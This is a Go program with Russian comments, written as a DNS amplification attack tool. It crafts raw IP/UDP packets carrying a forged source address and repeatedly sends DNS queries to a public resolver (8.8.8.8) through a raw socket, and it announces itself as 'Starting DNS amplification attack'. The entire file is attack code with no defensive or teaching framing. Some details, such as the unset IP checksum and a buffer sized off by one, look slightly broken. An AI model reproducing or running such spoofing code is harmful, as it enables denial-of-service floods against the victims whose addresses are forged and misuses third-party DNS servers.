package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"syscall"
	"time"
)

func CreateIPheader(srcIP, dstIP string, dataLen int) []byte {
	header := make([]byte, 20)

	header[0] = 0x45
	header[1] = 0x00

	binary.BigEndian.PutUint16(header[2:4], uint16(20+dataLen))
	binary.BigEndian.PutUint16(header[4:6], 0x0666)
	binary.BigEndian.PutUint16(header[6:8], 0x0000)

	header[8] = 64
	header[9] = 17

	binary.BigEndian.PutUint16(header[10:12], 0)

	copy(header[12:16], net.ParseIP(srcIP).To4())
	copy(header[16:20], net.ParseIP(dstIP).To4())

	return header
}

func splitDomain(domain string) [][]byte {

	var parts [][]byte
	start := 0
	for i, ch := range domain {
		if ch == '.' {
			parts = append(parts, []byte(domain[start:i]))
			start = i + 1
		}
	}
	parts = append(parts, []byte(domain[start:]))
	return parts
}

func createDnsQuery(domain string) []byte {
	query := make([]byte, 12+len(domain)+5)

	query[0] = 0xAA
	query[1] = 0xBB
	query[2] = 0x01
	query[3] = 0x00
	query[4] = 0x00
	query[5] = 0x01

	for i := 6; i < 12; i++ {
		query[i] = 0x00
	}

	offset := 12
	parts := splitDomain(domain)
	for _, part := range parts {
		query[offset] = byte(len(part))
		offset++
		copy(query[offset:], part)
		offset += len(part)
	}
	query[offset] = 0x00
	offset++

	query[offset] = 0x00
	query[offset+1] = 0x01
	query[offset+2] = 0x00
	query[offset+3] = 0x01

	return query

}

func createUDPHeader(srcPort, dstPort, length int) []byte {
	header := make([]byte, 8)

	binary.BigEndian.PutUint16(header[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(header[2:4], uint16(dstPort))
	binary.BigEndian.PutUint16(header[4:6], uint16(length))
	binary.BigEndian.PutUint16(header[6:8], 0)

	return header
}

func calculateCheckSum(data []byte) uint16 {
	var sum uint32

	for i := 0; i < len(data); i += 2 {
		var word uint16
		if i+1 < len(data) {
			word = binary.BigEndian.Uint16(data[i : i+2])
		} else {
			word = uint16(data[i]) << 8
		}
		sum += uint32(word)
	}

	for sum>>16 > 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}

	return ^uint16(sum)
}

func ipToArray(ip net.IP) [4]byte {
	var ipArray [4]byte
	copy(ipArray[:], ip.To4())
	return ipArray
}

func main() {
	spoofedIP := "192.168.1.100" // IP который мы подменяем (источник)
	dnsServer := "8.8.8.8:53"    // DNS-сервер для атаки
	domain := "example.com"      // Доменное имя для запроса
	count := 100

	fmt.Printf("Starting DNS amplification attack:\n")
	fmt.Printf("Spoofed IP: %s\n", spoofedIP)
	fmt.Printf("DNS Server: %s\n", dnsServer)
	fmt.Printf("Domain: %s\n", domain)
	fmt.Printf("Packets: %d\n\n", count)

	// Создаем RAW-сокет
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatalf("Failed to create raw socket (need root privileges): %v", err)
	}
	defer syscall.Close(fd)

	// Преобразуем адрес DNS-сервера
	dnsIP := net.ParseIP(dnsServer[:len(dnsServer)-3]).To4()
	if dnsIP == nil {
		log.Fatalf("Invalid DNS server IP")
	}

	addr := syscall.SockaddrInet4{
		Port: 53,
		Addr: ipToArray(dnsIP),
	}

	// Формируем DNS-запрос
	dnsQuery := createDnsQuery(domain)

	// Формируем UDP-заголовок
	udpHeader := createUDPHeader(12345, 53, 8+len(dnsQuery))

	// Формируем псевдо-заголовок для UDP контрольной суммы (необязательно)
	udpPacket := append(udpHeader, dnsQuery...)

	// Формируем IP-заголовок
	ipHeader := CreateIPheader(spoofedIP, dnsIP.String(), len(udpPacket))

	// Собираем полный пакет
	fullPacket := append(ipHeader, udpPacket...)

	// Отправляем пакеты
	for i := 0; i < count; i++ {
		err := syscall.Sendto(fd, fullPacket, 0, &addr)
		if err != nil {
			log.Printf("Failed to send packet %d: %v", i, err)
		} else {
			fmt.Printf("Sent packet %d/%d\r", i+1, count)
		}
		time.Sleep(100 * time.Millisecond) // Задержка между пакетами
	}

	fmt.Printf("\nDone! Sent %d packets\n", count)
}
